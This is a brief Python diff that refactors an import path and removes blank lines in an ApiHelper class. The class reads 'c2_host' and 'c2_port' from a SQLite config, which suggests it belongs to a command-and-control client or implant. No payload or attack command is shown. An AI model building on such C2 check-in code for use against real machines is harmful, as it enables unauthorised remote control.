@@ -3,7 +3,7 @@ from socket import gethostname
 from sys import platform
 
 from .settings import *
-from .decorators import Request
+from .lib.decorators import Request
 
 from .db.SQLite import Helper
 
@@ -12,9 +12,6 @@ class ApiHelper(object):
     def __init__(self):
         self.db = Helper()
         self.fetch = Request(self.db.get_config('c2_host'), port=int(self.db.get_config('c2_port')))
-
-
-
 
     def register(self):
         data = {
